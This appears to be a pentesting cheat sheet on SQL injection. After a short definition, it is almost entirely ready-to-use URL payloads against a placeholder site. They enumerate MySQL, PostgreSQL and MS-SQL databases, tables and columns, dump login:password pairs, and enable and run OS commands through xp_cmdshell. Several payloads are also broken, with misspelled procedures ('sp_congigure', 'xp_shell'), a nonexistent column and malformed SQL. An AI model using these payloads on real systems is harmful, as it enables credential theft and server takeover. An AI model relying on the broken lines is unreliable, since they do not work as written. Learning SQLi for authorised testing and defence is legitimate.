# SQL injection 

## Introduction
It is an attack in which an attacker inserts untrusted data in the application that results in revealing sensitive information of the database. 

SQL Injection (SQLi) is a code injection attack where an attacker manipulates the data being sent to the server to execute malicious SQL statements to control a web application’s database server, thereby accessing, modifying and deleting unauthorized data. This attack is mainly used to take over database servers. 

- In-band SQLi (Classic SQLi) 
- Error-based SQLi
- Union-based SQLi 
- Inferential SQLi (Blind SQLi) 
- Boolean-based (content-based) Blind SQLi 
- Time-based Blind SQLi 
- Out-of-band SQLi 

## Where to find
Everywhere

## How to exploit
# SQLI tricks

## GET

### Error-Based

### Simple test

`Adding a simpe quote '`

Example: `http://vulnerable-website.com/Less-1/?id=5'`

### Fuzzing

Sorting columns to find maximum column

`http://vulnerable-website.com/Less-1/?id=-1 order by 1`

`http://vulnerable-website.com/Less-1/?id=-1 order by 2`

`http://vulnerable-website.com/Less-1/?id=-1 order by 3`

(until it stop returning errors)

---


### Finding what column is injectable

**mysql**
`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, 3` (using the same amount of columns you got on the previous step)

**postgresql**
`http://vulnerable-website.com/Less-1/?id=-1 union select NULL, NULL, NULL` (using the same amount of columns you got on the previous step)

 one of the columns will be printed with the respective number

---


#### Finding version

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, version()` **mysql**
`http://vulnerable-website.com/Less-1/?id=-1 union select NULL, NULL, version()` **postgres**s


#### Finding database name

`http://vulnerable-website.com/Less-1/?id=-1 union select 1,2, database()` **mysql**

`http://vulnerable-website.com/Less-1/?id=-1 union select NULL,NULL, database()` **postgres**


#### Finding usernames logged in

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, current_user()` **mysql**


#### Finding databases

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, schema_name from information_schema.schemata` **mysql**

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, datname from pg_database` **postgres**


#### Finding table names from a database

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, table_name from information_schema.tables where table_schema="database_name"` **mysql**

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, tablename from pg_tables where table_catalog="database_name"` **postgres**


#### Finding column names from a table

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, column_name from information_schema.columns where table_schema="database_name" and table_name="tablename"` **mysql**

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, column_name from information_schema.columns where table_catalog="database_name" and table_name="tablename"` **postgres**

#### Concatenate

Example:

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, login from users;`
`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, password from users;`

in one query

`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, concat(login,':',password) from users;` **mysql**
`http://vulnerable-website.com/Less-1/?id=-1 union select 1, 2, login||':'||password from users;` **postgres**


### Error Based SQLI (USUALLY MS-SQL)

#### Current user

`http://vulnerable-website.com/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096)))--`


#### DBMS version

`http://vulnerable-website.com/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096)))--`


#### Database name

`http://vulnerable-website.com/Less-1/?id=-1 or db_name(0)=0 --`


#### Tables from a database

`http://vulnerable-website.com/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM dbname..sysobjects where xtype='U')--`

---

`http://vulnerable-website.com/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM dbname..sysobjects where xtype='U' AND name NOT IN ('previouslyFoundTable',...))--`


#### Columns within a table


`http://vulnerable-website.com/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--`

> remember to change **dbname** and **tablename** accordingly with the given situation
> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample

`http://vulnerable-website.com/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--`


#### Actual data


`http://vulnerable-website.com/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--`

> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample

`http://vulnerable-website.com/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename AND name NOT IN('previously found row data'))--`


#### Shell commands

`EXEC master..xp_cmdshell <command>`

> you need yo be 'sa' user

#### Enabling shell commands

`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_congigure 'xp_shell', 1; RECONFIGURE;`
